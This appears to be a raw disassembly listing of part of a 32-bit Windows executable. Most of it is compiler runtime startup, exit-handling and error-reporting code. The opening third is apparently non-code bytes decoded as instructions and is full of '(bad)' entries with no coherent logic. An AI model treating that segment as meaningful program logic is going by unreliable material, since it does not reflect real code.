  424269:	imul   edx,DWORD PTR [esp+edi*1],0x3f569f58
  424270:	and    eax,0x7e94132d
  424275:	add    DWORD PTR [ecx-0x45],ecx
  424278:	sub    edx,DWORD PTR [ecx-0x48]
  42427b:	mov    al,0x93
  42427d:	sahf   
  42427e:	ins    DWORD PTR es:[edi],dx
  42427f:	or     eax,0x127ea74c
  424284:	sbb    al,0x9
  424286:	repnz mov ebx,0xb2a3614f
  42428c:	mov    bl,0x8c
  42428e:	xor    BYTE PTR [eax+0xa],cl
  424291:	lods   eax,DWORD PTR ds:[esi]
  424292:	(bad)  
  424294:	inc    esi
  424295:	ins    DWORD PTR es:[edi],dx
  424296:	jl     0x42423a
  424298:	mov    edi,0xa7fc314
  42429d:	pop    edi
  42429e:	mov    ah,BYTE PTR ds:0x78000a84
  4242a4:	out    0xe9,al
  4242a6:	and    dh,BYTE PTR [ecx+0x35]
  4242a9:	jle    0x42427b
  4242ab:	in     al,0xd1
  4242ad:	xchg   ebx,eax
  4242ae:	mov    bl,BYTE PTR [ecx+edx*8-0x499932b7]
  4242b5:	mov    ebp,0x6ea7606e
  4242ba:	jecxz  0x424252
  4242bc:	ret    
  4242bd:	ins    DWORD PTR es:[edi],dx
  4242be:	enter  0xf258,0xd8
  4242c2:	(bad)  
  4242c3:	faddp  st(1),st
  4242c5:	push   edi
  4242c6:	out    0x62,eax
  4242c8:	pop    ebp
  4242c9:	dec    ebx
  4242ca:	mov    WORD PTR [edi+0x6e],cs
  4242cd:	cdq    
  4242ce:	xchg   DWORD PTR [edi-0x5eded92a],edx
  4242d4:	cmp    cl,BYTE PTR [eax-0x5187bf4a]
  4242da:	fldcw  WORD PTR [edi+0x4f]
  4242dd:	inc    ecx
  4242de:	push   ebx
  4242df:	or     BYTE PTR [edx+0x31],bh
  4242e2:	stc    
  4242e3:	(bad)  
  4242e4:	in     eax,0xab
  4242e6:	aad    0xbd
  4242e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242e9:	jb     0x42430c
  4242eb:	das    
  4242ec:	stos   DWORD PTR es:[edi],eax
  4242ed:	mov    bl,0xf3
  4242ef:	loope  0x4242e9
  4242f1:	or     ch,BYTE PTR [esi+0x5f]
  4242f4:	mov    ebx,0x864449fd
  4242f9:	daa    
  4242fa:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4242fc:	int    0x5b
  4242fe:	gs jae 0x424300
  424301:	test   eax,0x108b1e46
  424306:	mov    BYTE PTR [edi],cl
  424308:	retf   0x1d98
  42430b:	jbe    0x42437a
  42430d:	(bad)
  424311:	and    al,0x5
  424313:	pop    ecx
  424314:	push   cs
  424315:	sub    eax,0x526ab186
  42431a:	dec    esi
  42431b:	sahf   
  42431c:	jnp    0x4242e5
  42431e:	dec    edx
  42431f:	cmc    
  424320:	sbb    eax,0xc614ee81
  424325:	mov    ebx,0x68380c12
  42432a:	imul   ebp,DWORD PTR [edx+0x3cda6fca],0xffffffed
  424331:	adc    eax,0x507c5b7c
  424336:	add    al,0x9
  424338:	push   0x2f
  42433a:	and    esp,DWORD PTR [ebx+ebp*4-0x3d19574a]
  424341:	and    BYTE PTR cs:[ebx+0x1],dh
  424345:	test   BYTE PTR [ecx-0x72],ch
  424348:	mov    WORD PTR [ebx+0x66093e0],ss
  42434e:	adc    eax,0xca1f20af
  424353:	push   es
  424354:	pop    eax
  424355:	dec    esp
  424356:	jnp    0x4242f1
  424358:	dec    ebx
  424359:	push   ebx
  42435a:	and    cl,ah
  42435c:	mov    bh,ch
  42435e:	dec    ebx
  42435f:	ins    DWORD PTR es:[edi],dx
  424360:	outs   dx,DWORD PTR ds:[esi]
  424361:	popf   
  424362:	xchg   DWORD PTR [ecx+0x6843edcc],ebp
  424368:	xor    al,0xca
  42436a:	pop    esi
  42436b:	inc    edx
  42436c:	mov    edx,0xc5eef0fb
  424371:	mov    bl,0x2a
  424373:	inc    esp
  424374:	setl   BYTE PTR [esi+0x5b]
  424378:	xchg   ebp,eax
  424379:	(bad)  
  42437a:	es jns 0x424367
  42437d:	fwait
  42437e:	xchg   edi,eax
  42437f:	jle    0x424390
  424381:	rcr    BYTE PTR [edi],cl
  424383:	inc    ebp
  424384:	or     DWORD PTR [eax-0x32ba79b4],edx
  42438a:	push   es
  42438b:	inc    ebx
  42438c:	xchg   ebx,eax
  42438d:	cld    
  42438e:	push   edx
  42438f:	retf   0x7515
  424392:	inc    eax
  424393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424394:	jmp    0xac37:0x67aed49c
  42439b:	call   0x331fc54f
  4243a0:	mov    dl,0xbd
  4243a2:	test   DWORD PTR [edi],esp
  4243a4:	repnz retf 0x4e04
  4243a8:	rcr    ebx,cl
  4243aa:	push   ebp
  4243ab:	mov    esi,ss
  4243ad:	pop    esi
  4243ae:	xchg   edi,eax
  4243af:	or     ecx,esp
  4243b1:	pop    edi
  4243b2:	sub    DWORD PTR [ebx],edx
  4243b4:	push   ds
  4243b5:	ret    
  4243b6:	add    bl,BYTE PTR [esi]
  4243b8:	mov    ch,0x16
  4243ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4243bb:	int3   
  4243bc:	cdq    
  4243bd:	test   al,0x2d
  4243bf:	arpl   si,si
  4243c1:	loope  0x424353
  4243c3:	mov    al,0xb9
  4243c5:	je     0x4243df
  4243c7:	rcr    DWORD PTR [ebx+0x28245ea1],cl
  4243cd:	mov    ebx,0xe2885adc
  4243d2:	jo     0x42442b
  4243d4:	and    eax,DWORD PTR [esi-0x40d09240]
  4243da:	jbe    0x42440e
  4243dc:	imul   ebx,DWORD PTR [ebx-0x311ede38],0x63617402
  4243e6:	or     esp,edx
  4243e8:	adc    ebp,DWORD PTR [edx+0x63]
  4243eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4243ec:	ficomp WORD PTR [edi-0x7b]
  4243ef:	mov    edx,0xa204c01c
  4243f4:	ficomp DWORD PTR [edx+0x1d]
  4243f7:	add    ch,BYTE PTR [eax+ecx*4]
  4243fa:	(bad)  
  4243fb:	sbb    eax,0x2b835222
  424400:	je     0x4243f9
  424402:	mov    ah,0xe9
  424404:	mov    BYTE PTR [edi],cl
  424406:	inc    ebx
  424407:	out    dx,eax
  424408:	pop    esi
  424409:	(bad)  
  42440a:	retf   0xc48f
  42440d:	jae    0x4243cc
  42440f:	mov    ds:0x640f7cc2,al
  424414:	jo     0x424407
  424416:	inc    edi
  424417:	mov    ds:0xdfedf7f,al
  42441c:	xor    DWORD PTR [eax+0x29],0x4e
  424420:	dec    ebx
  424421:	(bad)  
  424422:	fstp   QWORD PTR [ebp-0x40a1e5d9]
  424428:	ja     0x4244a9
  42442a:	push   cs
  42442b:	mov    al,bh
  42442d:	ds iret 
  42442f:	sbb    edx,esi
  424431:	ds (bad) 
  424433:	xchg   esi,eax
  424434:	push   ecx
  424435:	scas   eax,DWORD PTR es:[edi]
  424436:	out    0xdc,eax
  424438:	xor    eax,0xa14b090b
  42443d:	popf   
  42443e:	hlt    
  42443f:	jmp    0x1260:0x575f17d
  424446:	and    dl,BYTE PTR [ebx+0x7115ed73]
  42444c:	sub    al,al
  42444e:	adc    ebx,DWORD PTR [ecx]
  424450:	ins    BYTE PTR es:[edi],dx
  424451:	xor    eax,0xfff3a068
  424456:	in     eax,dx
  424457:	or     BYTE PTR [ecx-0x52165f64],ch
  42445d:	mov    al,0xeb
  42445f:	inc    ebp
  424460:	pop    ecx
  424461:	popa   
  424462:	jmp    0x1650:0x64066577
  424469:	dec    edx
  42446a:	(bad)  
  42446b:	jmp    0x27e4:0xaf1b152a
  424472:	pop    es
  424473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424474:	push   0x63
  424476:	sub    eax,0xe7c27a69
  42447b:	inc    esi
  42447c:	fdivr  DWORD PTR [edi]
  42447e:	adc    BYTE PTR [edx],al
  424480:	jmp    0x75837dd5
  424485:	add    BYTE PTR [ebx-0x11e99d33],bh
  42448b:	cmp    ecx,DWORD PTR [esi]
  42448d:	retf   
  42448e:	not    DWORD PTR [ebp+0x2265dade]
  424494:	lahf   
  424495:	mov    cl,0xd4
  424497:	mov    ch,0xe4
  424499:	fisub  DWORD PTR [eax]
  42449b:	dec    ebx
  42449c:	adc    DWORD PTR [edx+0x54aa0eca],esp
  4244a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244a3:	mov    ebx,0x2c21061
  4244a8:	jno    0x424509
  4244aa:	jnp    0x4244c1
  4244ac:	je     0x424474
  4244ae:	mov    cl,0x88
  4244b0:	or     bh,BYTE PTR [esi+eax*1]
  4244b3:	inc    edi
  4244b4:	jmp    0x424477
  4244b6:	and    DWORD PTR [eax+0x788515b8],esp
  4244bc:	adc    ah,al
  4244be:	and    dh,BYTE PTR [ecx-0x44]
  4244c1:	mov    edx,0x6ad41a
  4244c6:	push   0x0
  4244c8:	call   0x4244f0
  4244cd:	push   0xa
  4244cf:	push   0x0
  4244d1:	push   0x0
  4244d3:	call   DWORD PTR ds:0x429054
  4244d9:	xor    eax,eax
  4244db:	add    esp,0x10
  4244de:	ret    0x10
  4244e1:	nop
  4244e2:	nop
  4244e3:	nop
  4244e4:	nop
  4244e5:	nop
  4244e6:	nop
  4244e7:	nop
  4244e8:	nop
  4244e9:	nop
  4244ea:	nop
  4244eb:	nop
  4244ec:	nop
  4244ed:	nop
  4244ee:	nop
  4244ef:	nop
  4244f0:	jmp    DWORD PTR ds:0x429144
  4244f6:	jmp    DWORD PTR ds:0x429140
  4244fc:	cmp    DWORD PTR ds:0x4635bc,0x1
  424503:	jne    0x42450a
  424505:	call   0x424a48
  42450a:	push   DWORD PTR [esp+0x4]
  42450e:	call   0x4248d1
  424513:	push   0xff
  424518:	call   DWORD PTR ds:0x462cb4
  42451e:	pop    ecx
  42451f:	pop    ecx
  424520:	ret    
  424521:	cmp    DWORD PTR ds:0x4635bc,0x1
  424528:	jne    0x42452f
  42452a:	call   0x424a48
  42452f:	push   DWORD PTR [esp+0x4]
  424533:	call   0x4248d1
  424538:	push   0xff
  42453d:	call   0x424717
  424542:	pop    ecx
  424543:	pop    ecx
  424544:	ret    
  424545:	push   0x60
  424547:	push   0x429268
  42454c:	call   0x425434
  424551:	mov    edi,0x94
  424556:	mov    eax,edi
  424558:	call   0x425480
  42455d:	mov    DWORD PTR [ebp-0x18],esp
  424560:	mov    esi,esp
  424562:	mov    DWORD PTR [esi],edi
  424564:	push   esi
  424565:	call   DWORD PTR ds:0x429098
  42456b:	mov    ecx,DWORD PTR [esi+0x10]
  42456e:	mov    DWORD PTR ds:0x4635c4,ecx
  424574:	mov    eax,DWORD PTR [esi+0x4]
  424577:	mov    ds:0x4635d0,eax
  42457c:	mov    edx,DWORD PTR [esi+0x8]
  42457f:	mov    DWORD PTR ds:0x4635d4,edx
  424585:	mov    esi,DWORD PTR [esi+0xc]
  424588:	and    esi,0x7fff
  42458e:	mov    DWORD PTR ds:0x4635c8,esi
  424594:	cmp    ecx,0x2
  424597:	je     0x4245a5
  424599:	or     esi,0x8000
  42459f:	mov    DWORD PTR ds:0x4635c8,esi
  4245a5:	shl    eax,0x8
  4245a8:	add    eax,edx
  4245aa:	mov    ds:0x4635cc,eax
  4245af:	xor    esi,esi
  4245b1:	push   esi
  4245b2:	mov    edi,DWORD PTR ds:0x42902c
  4245b8:	call   edi
  4245ba:	cmp    WORD PTR [eax],0x5a4d
  4245bf:	jne    0x4245e0
  4245c1:	mov    ecx,DWORD PTR [eax+0x3c]
  4245c4:	add    ecx,eax
  4245c6:	cmp    DWORD PTR [ecx],0x4550
  4245cc:	jne    0x4245e0
  4245ce:	movzx  eax,WORD PTR [ecx+0x18]
  4245d2:	cmp    eax,0x10b
  4245d7:	je     0x4245f8
  4245d9:	cmp    eax,0x20b
  4245de:	je     0x4245e5
  4245e0:	mov    DWORD PTR [ebp-0x1c],esi
  4245e3:	jmp    0x42460c
  4245e5:	cmp    DWORD PTR [ecx+0x84],0xe
  4245ec:	jbe    0x4245e0
  4245ee:	xor    eax,eax
  4245f0:	cmp    DWORD PTR [ecx+0xf8],esi
  4245f6:	jmp    0x424606
  4245f8:	cmp    DWORD PTR [ecx+0x74],0xe
  4245fc:	jbe    0x4245e0
  4245fe:	xor    eax,eax
  424600:	cmp    DWORD PTR [ecx+0xe8],esi
  424606:	setne  al
  424609:	mov    DWORD PTR [ebp-0x1c],eax
  42460c:	push   0x1
  42460e:	call   0x4253e3
  424613:	pop    ecx
  424614:	test   eax,eax
  424616:	jne    0x424620
  424618:	push   0x1c
  42461a:	call   0x424521
  42461f:	pop    ecx
  424620:	call   0x42535a
  424625:	test   eax,eax
  424627:	jne    0x424631
  424629:	push   0x10
  42462b:	call   0x424521
  424630:	pop    ecx
  424631:	call   0x425243
  424636:	mov    DWORD PTR [ebp-0x4],esi
  424639:	call   0x425045
  42463e:	test   eax,eax
  424640:	jge    0x42464a
  424642:	push   0x1b
  424644:	call   0x4244fc
  424649:	pop    ecx
  42464a:	call   DWORD PTR ds:0x429094
  424650:	mov    ds:0x463d74,eax
  424655:	call   0x424f23
  42465a:	mov    ds:0x4635b4,eax
  42465f:	call   0x424e81
  424664:	test   eax,eax
  424666:	jge    0x424670
  424668:	push   0x8
  42466a:	call   0x4244fc
  42466f:	pop    ecx
  424670:	call   0x424c4e
  424675:	test   eax,eax
  424677:	jge    0x424681
  424679:	push   0x9
  42467b:	call   0x4244fc
  424680:	pop    ecx
  424681:	call   0x424759
  424686:	mov    DWORD PTR [ebp-0x20],eax
  424689:	cmp    eax,esi
  42468b:	je     0x424694
  42468d:	push   eax
  42468e:	call   0x4244fc
  424693:	pop    ecx
  424694:	mov    DWORD PTR [ebp-0x38],esi
  424697:	lea    eax,[ebp-0x64]
  42469a:	push   eax
  42469b:	call   DWORD PTR ds:0x429090
  4246a1:	call   0x424be5
  4246a6:	mov    DWORD PTR [ebp-0x68],eax
  4246a9:	test   BYTE PTR [ebp-0x38],0x1
  4246ad:	je     0x4246b5
  4246af:	movzx  eax,WORD PTR [ebp-0x34]
  4246b3:	jmp    0x4246b8
  4246b5:	push   0xa
  4246b7:	pop    eax
  4246b8:	push   eax
  4246b9:	push   DWORD PTR [ebp-0x68]
  4246bc:	push   esi
  4246bd:	push   esi
  4246be:	call   edi
  4246c0:	push   eax
  4246c1:	call   0x423030
  4246c6:	mov    edi,eax
  4246c8:	mov    DWORD PTR [ebp-0x6c],edi
  4246cb:	cmp    DWORD PTR [ebp-0x1c],esi
  4246ce:	jne    0x4246d6
  4246d0:	push   edi
  4246d1:	call   0x424891
  4246d6:	call   0x4248b3
  4246db:	jmp    0x424708
  4246dd:	mov    eax,DWORD PTR [ebp-0x14]
  4246e0:	mov    ecx,DWORD PTR [eax]
  4246e2:	mov    ecx,DWORD PTR [ecx]
  4246e4:	mov    DWORD PTR [ebp-0x70],ecx
  4246e7:	push   eax
  4246e8:	push   ecx
  4246e9:	call   0x424a81
  4246ee:	pop    ecx
  4246ef:	pop    ecx
  4246f0:	ret    
  4246f1:	mov    esp,DWORD PTR [ebp-0x18]
  4246f4:	mov    edi,DWORD PTR [ebp-0x70]
  4246f7:	cmp    DWORD PTR [ebp-0x1c],0x0
  4246fb:	jne    0x424703
  4246fd:	push   edi
  4246fe:	call   0x4248a2
  424703:	call   0x4248c2
  424708:	or     DWORD PTR [ebp-0x4],0xffffffff
  42470c:	mov    eax,edi
  42470e:	lea    esp,[ebp-0x7c]
  424711:	call   0x42546f
  424716:	ret    
  424717:	push   0x429284
  42471c:	call   DWORD PTR ds:0x42902c
  424722:	test   eax,eax
  424724:	je     0x42473c
  424726:	push   0x429274
  42472b:	push   eax
  42472c:	call   DWORD PTR ds:0x429028
  424732:	test   eax,eax
  424734:	je     0x42473c
  424736:	push   DWORD PTR [esp+0x4]
  42473a:	call   eax
  42473c:	push   DWORD PTR [esp+0x4]
  424740:	call   DWORD PTR ds:0x42909c
  424746:	int3   
  424747:	push   0x8
  424749:	call   0x4255ef
  42474e:	pop    ecx
  42474f:	ret    
  424750:	push   0x8
  424752:	call   0x42555b
  424757:	pop    ecx
  424758:	ret    
  424759:	mov    eax,ds:0x463d70
  42475e:	test   eax,eax
  424760:	je     0x424764
  424762:	call   eax
  424764:	push   esi
  424765:	push   edi
  424766:	mov    ecx,0x42b00c
  42476b:	mov    edi,0x42b018
  424770:	xor    eax,eax
  424772:	cmp    ecx,edi
  424774:	mov    esi,ecx
  424776:	jae    0x42478f
  424778:	test   eax,eax
  42477a:	jne    0x4247bb
  42477c:	mov    ecx,DWORD PTR [esi]
  42477e:	test   ecx,ecx
  424780:	je     0x424784
  424782:	call   ecx
  424784:	add    esi,0x4
  424787:	cmp    esi,edi
  424789:	jb     0x424778
  42478b:	test   eax,eax
  42478d:	jne    0x4247bb
  42478f:	push   0x425287
  424794:	call   0x425700
  424799:	mov    esi,0x42b000
  42479e:	mov    eax,esi
  4247a0:	mov    edi,0x42b008
  4247a5:	cmp    eax,edi
  4247a7:	pop    ecx
  4247a8:	jae    0x4247b9
  4247aa:	mov    eax,DWORD PTR [esi]
  4247ac:	test   eax,eax
  4247ae:	je     0x4247b2
  4247b0:	call   eax
  4247b2:	add    esi,0x4
  4247b5:	cmp    esi,edi
  4247b7:	jb     0x4247aa
  4247b9:	xor    eax,eax
  4247bb:	pop    edi
  4247bc:	pop    esi
  4247bd:	ret    
  4247be:	push   ebp
  4247bf:	mov    ebp,esp
  4247c1:	push   esi
  4247c2:	push   edi
  4247c3:	push   0x8
  4247c5:	call   0x4255ef
  4247ca:	xor    esi,esi
  4247cc:	inc    esi
  4247cd:	cmp    DWORD PTR ds:0x463604,esi
  4247d3:	pop    ecx
  4247d4:	jne    0x4247e6
  4247d6:	push   DWORD PTR [ebp+0x8]
  4247d9:	call   DWORD PTR ds:0x429064
  4247df:	push   eax
  4247e0:	call   DWORD PTR ds:0x4290a0
  4247e6:	cmp    DWORD PTR [ebp+0xc],0x0
  4247ea:	mov    al,BYTE PTR [ebp+0x10]
  4247ed:	mov    DWORD PTR ds:0x463600,esi
  4247f3:	mov    ds:0x4635fc,al
  4247f8:	jne    0x42484c
  4247fa:	mov    ecx,DWORD PTR ds:0x463d68
  424800:	test   ecx,ecx
  424802:	je     0x42482d
  424804:	mov    eax,ds:0x463d64
  424809:	sub    eax,0x4
  42480c:	cmp    eax,ecx
  42480e:	jmp    0x424826
  424810:	mov    eax,DWORD PTR [eax]
  424812:	test   eax,eax
  424814:	je     0x424818
  424816:	call   eax
  424818:	mov    eax,ds:0x463d64
  42481d:	sub    eax,0x4
  424820:	cmp    eax,DWORD PTR ds:0x463d68
  424826:	mov    ds:0x463d64,eax
  42482b:	jae    0x424810
  42482d:	mov    eax,0x42b01c
  424832:	mov    esi,0x42b020
  424837:	cmp    eax,esi
  424839:	mov    edi,eax
  42483b:	jae    0x42484c
  42483d:	mov    eax,DWORD PTR [edi]
  42483f:	test   eax,eax
  424841:	je     0x424845
  424843:	call   eax
  424845:	add    edi,0x4
  424848:	cmp    edi,esi
  42484a:	jb     0x42483d
  42484c:	mov    eax,0x42b024
  424851:	mov    esi,0x42b028
  424856:	cmp    eax,esi
  424858:	mov    edi,eax
  42485a:	jae    0x42486b
  42485c:	mov    eax,DWORD PTR [edi]
  42485e:	test   eax,eax
  424860:	je     0x424864
  424862:	call   eax
  424864:	add    edi,0x4
  424867:	cmp    edi,esi
  424869:	jb     0x42485c
  42486b:	cmp    DWORD PTR [ebp+0x10],0x0
  42486f:	pop    edi
  424870:	pop    esi
  424871:	je     0x42487c
  424873:	push   0x8
  424875:	call   0x42555b
  42487a:	jmp    0x42488e
  42487c:	push   DWORD PTR [ebp+0x8]
  42487f:	mov    DWORD PTR ds:0x463604,0x1
  424889:	call   0x424717
  42488e:	pop    ecx
  42488f:	pop    ebp
  424890:	ret    
  424891:	push   0x0
  424893:	push   0x0
  424895:	push   DWORD PTR [esp+0xc]
  424899:	call   0x4247be
  42489e:	add    esp,0xc
  4248a1:	ret    
  4248a2:	push   0x0
  4248a4:	push   0x1
  4248a6:	push   DWORD PTR [esp+0xc]
  4248aa:	call   0x4247be
  4248af:	add    esp,0xc
  4248b2:	ret    
  4248b3:	push   0x1
  4248b5:	push   0x0
  4248b7:	push   0x0
  4248b9:	call   0x4247be
  4248be:	add    esp,0xc
  4248c1:	ret    
  4248c2:	push   0x1
  4248c4:	push   0x1
  4248c6:	push   0x0
  4248c8:	call   0x4247be
  4248cd:	add    esp,0xc
  4248d0:	ret    
  4248d1:	push   ebp
  4248d2:	mov    ebp,esp
  4248d4:	sub    esp,0x10c
  4248da:	mov    eax,ds:0x462f30
  4248df:	xor    eax,DWORD PTR [ebp+0x4]
  4248e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4248e5:	push   ebx
  4248e6:	push   esi
  4248e7:	mov    DWORD PTR [ebp-0x4],eax
  4248ea:	xor    edx,edx
  4248ec:	push   edi
  4248ed:	xor    eax,eax
  4248ef:	cmp    ecx,DWORD PTR [eax*8+0x462cc0]
  4248f6:	je     0x4248fe
  4248f8:	inc    eax
  4248f9:	cmp    eax,0x12
  4248fc:	jb     0x4248ef
  4248fe:	mov    esi,eax
  424900:	shl    esi,0x3
  424903:	cmp    ecx,DWORD PTR [esi+0x462cc0]
  424909:	jne    0x424a32
  42490f:	mov    eax,ds:0x4635bc
  424914:	cmp    eax,0x1
  424917:	je     0x424a0d
  42491d:	cmp    eax,edx
  42491f:	jne    0x42492e
  424921:	cmp    DWORD PTR ds:0x462cb8,0x1
  424928:	je     0x424a0d
  42492e:	cmp    ecx,0xfc
  424934:	je     0x424a32
  42493a:	push   0x104
  42493f:	lea    eax,[ebp-0x10c]
  424945:	push   eax
  424946:	push   edx
  424947:	mov    BYTE PTR [ebp-0x8],dl
  42494a:	call   DWORD PTR ds:0x4290a8
  424950:	test   eax,eax
  424952:	jne    0x424967
  424954:	lea    eax,[ebp-0x10c]
  42495a:	push   0x4295dc
  42495f:	push   eax
  424960:	call   0x425810
  424965:	pop    ecx
  424966:	pop    ecx
  424967:	lea    eax,[ebp-0x10c]
  42496d:	push   eax
  42496e:	lea    edi,[ebp-0x10c]
  424974:	call   0x425a40
  424979:	inc    eax
  42497a:	cmp    eax,0x3c
  42497d:	pop    ecx
  42497e:	jbe    0x4249a9
  424980:	lea    eax,[ebp-0x10c]
  424986:	push   eax
  424987:	call   0x425a40
  42498c:	mov    edi,eax
  42498e:	lea    eax,[ebp-0x10c]
  424994:	sub    eax,0x3b
  424997:	push   0x3
  424999:	add    edi,eax
  42499b:	push   0x4295d8
  4249a0:	push   edi
  4249a1:	call   0x425910
  4249a6:	add    esp,0x10
  4249a9:	push   edi
  4249aa:	call   0x425a40
  4249af:	push   DWORD PTR [esi+0x462cc4]
  4249b5:	mov    ebx,eax
  4249b7:	call   0x425a40
  4249bc:	lea    eax,[ebx+eax*1+0x1c]
  4249c0:	pop    ecx
  4249c1:	add    eax,0x3
  4249c4:	pop    ecx
  4249c5:	and    eax,0xfffffffc
  4249c8:	call   0x425480
  4249cd:	mov    ebx,esp
  4249cf:	push   0x4295bc
  4249d4:	push   ebx
  4249d5:	call   0x425810
  4249da:	push   edi
  4249db:	push   ebx
  4249dc:	call   0x425820
  4249e1:	push   0x4295b8
  4249e6:	push   ebx
  4249e7:	call   0x425820
  4249ec:	push   DWORD PTR [esi+0x462cc4]
  4249f2:	push   ebx
  4249f3:	call   0x425820
  4249f8:	push   0x12010
  4249fd:	push   0x429590
  424a02:	push   ebx
  424a03:	call   0x425712
  424a08:	add    esp,0x2c
  424a0b:	jmp    0x424a32
  424a0d:	push   edx
  424a0e:	lea    eax,[ebp+0x8]
  424a11:	push   eax
  424a12:	lea    esi,[esi+0x462cc4]
  424a18:	push   DWORD PTR [esi]
  424a1a:	call   0x425a40
  424a1f:	pop    ecx
  424a20:	push   eax
  424a21:	push   DWORD PTR [esi]
  424a23:	push   0xfffffff4
  424a25:	call   DWORD PTR ds:0x4290a4
  424a2b:	push   eax
  424a2c:	call   DWORD PTR ds:0x429080
  424a32:	lea    esp,[ebp-0x118]
  424a38:	mov    ecx,DWORD PTR [ebp-0x4]
  424a3b:	xor    ecx,DWORD PTR [ebp+0x4]
  424a3e:	call   0x425afc
  424a43:	pop    edi
  424a44:	pop    esi
  424a45:	pop    ebx
  424a46:	leave  
  424a47:	ret    
  424a48:	mov    eax,ds:0x4635bc
  424a4d:	cmp    eax,0x1
  424a50:	je     0x424a5f
  424a52:	test   eax,eax
  424a54:	jne    0x424a80
  424a56:	cmp    DWORD PTR ds:0x462cb8,0x1
  424a5d:	jne    0x424a80
  424a5f:	push   0xfc
  424a64:	call   0x4248d1
  424a69:	mov    eax,ds:0x463608
  424a6e:	test   eax,eax
  424a70:	pop    ecx
  424a71:	je     0x424a75
  424a73:	call   eax
  424a75:	push   0xff
  424a7a:	call   0x4248d1
  424a7f:	pop    ecx
  424a80:	ret    
  424a81:	push   ebp
  424a82:	mov    ebp,esp
  424a84:	push   ecx
  424a85:	push   ebx
  424a86:	push   esi
  424a87:	push   edi
  424a88:	call   0x4252e9
  424a8d:	mov    edi,DWORD PTR [ebp+0x8]
  424a90:	mov    esi,eax
  424a92:	mov    edx,DWORD PTR [esi+0x54]
  424a95:	mov    eax,ds:0x462dd4
  424a9a:	mov    ecx,edx
  424a9c:	cmp    DWORD PTR [ecx],edi
  424a9e:	je     0x424aad
  424aa0:	lea    ebx,[eax+eax*2]
  424aa3:	add    ecx,0xc
  424aa6:	lea    ebx,[edx+ebx*4]
  424aa9:	cmp    ecx,ebx
  424aab:	jb     0x424a9c
  424aad:	lea    eax,[eax+eax*2]
  424ab0:	lea    eax,[edx+eax*4]
  424ab3:	cmp    ecx,eax
  424ab5:	jae    0x424abb
  424ab7:	cmp    DWORD PTR [ecx],edi
  424ab9:	je     0x424abd
  424abb:	xor    ecx,ecx
  424abd:	test   ecx,ecx
  424abf:	je     0x424bd7
  424ac5:	mov    ebx,DWORD PTR [ecx+0x8]
  424ac8:	test   ebx,ebx
  424aca:	mov    DWORD PTR [ebp+0x8],ebx
  424acd:	je     0x424bd7
  424ad3:	cmp    ebx,0x5
  424ad6:	jne    0x424ae4
  424ad8:	and    DWORD PTR [ecx+0x8],0x0
  424adc:	xor    eax,eax
  424ade:	inc    eax
  424adf:	jmp    0x424be0
  424ae4:	cmp    ebx,0x1
  424ae7:	je     0x424bd2
  424aed:	mov    eax,DWORD PTR [esi+0x58]
  424af0:	mov    DWORD PTR [ebp-0x4],eax
  424af3:	mov    eax,DWORD PTR [ebp+0xc]
  424af6:	mov    DWORD PTR [esi+0x58],eax
  424af9:	mov    eax,DWORD PTR [ecx+0x4]
  424afc:	cmp    eax,0x8
  424aff:	jne    0x424bc4
  424b05:	mov    edx,DWORD PTR ds:0x462dc8
  424b0b:	mov    eax,ds:0x462dcc
  424b10:	add    eax,edx
  424b12:	cmp    edx,eax
  424b14:	jge    0x424b3d
  424b16:	lea    eax,[edx+edx*2]
  424b19:	shl    eax,0x2
  424b1c:	mov    edi,DWORD PTR [esi+0x54]
  424b1f:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424b24:	mov    edi,DWORD PTR ds:0x462dc8
  424b2a:	mov    ebx,DWORD PTR ds:0x462dcc
  424b30:	inc    edx
  424b31:	add    ebx,edi
  424b33:	add    eax,0xc
  424b36:	cmp    edx,ebx
  424b38:	jl     0x424b1c
  424b3a:	mov    ebx,DWORD PTR [ebp+0x8]
  424b3d:	mov    ecx,DWORD PTR [ecx]
  424b3f:	cmp    ecx,0xc000008e
  424b45:	mov    edi,DWORD PTR [esi+0x5c]
  424b48:	jne    0x424b53
  424b4a:	mov    DWORD PTR [esi+0x5c],0x83
  424b51:	jmp    0x424bb7
  424b53:	cmp    ecx,0xc0000090
  424b59:	jne    0x424b64
  424b5b:	mov    DWORD PTR [esi+0x5c],0x81
  424b62:	jmp    0x424bb7
  424b64:	cmp    ecx,0xc0000091
  424b6a:	jne    0x424b75
  424b6c:	mov    DWORD PTR [esi+0x5c],0x84
  424b73:	jmp    0x424bb7
  424b75:	cmp    ecx,0xc0000093
  424b7b:	jne    0x424b86
  424b7d:	mov    DWORD PTR [esi+0x5c],0x85
  424b84:	jmp    0x424bb7
  424b86:	cmp    ecx,0xc000008d
  424b8c:	jne    0x424b97
  424b8e:	mov    DWORD PTR [esi+0x5c],0x82
  424b95:	jmp    0x424bb7
  424b97:	cmp    ecx,0xc000008f
  424b9d:	jne    0x424ba8
  424b9f:	mov    DWORD PTR [esi+0x5c],0x86
  424ba6:	jmp    0x424bb7
  424ba8:	cmp    ecx,0xc0000092
  424bae:	jne    0x424bb7
  424bb0:	mov    DWORD PTR [esi+0x5c],0x8a
  424bb7:	push   DWORD PTR [esi+0x5c]
  424bba:	push   0x8
  424bbc:	call   ebx
  424bbe:	pop    ecx
  424bbf:	mov    DWORD PTR [esi+0x5c],edi
  424bc2:	jmp    0x424bcb
  424bc4:	and    DWORD PTR [ecx+0x8],0x0
  424bc8:	push   eax
  424bc9:	call   ebx
  424bcb:	mov    eax,DWORD PTR [ebp-0x4]
  424bce:	pop    ecx
  424bcf:	mov    DWORD PTR [esi+0x58],eax
  424bd2:	or     eax,0xffffffff
  424bd5:	jmp    0x424be0
  424bd7:	push   DWORD PTR [ebp+0xc]
  424bda:	call   DWORD PTR ds:0x4290ac
  424be0:	pop    edi
  424be1:	pop    esi
  424be2:	pop    ebx
  424be3:	leave  
  424be4:	ret    
  424be5:	cmp    DWORD PTR ds:0x463d6c,0x0
  424bec:	jne    0x424bf3
  424bee:	call   0x42601c
  424bf3:	push   esi
  424bf4:	mov    esi,DWORD PTR ds:0x463d74
  424bfa:	test   esi,esi
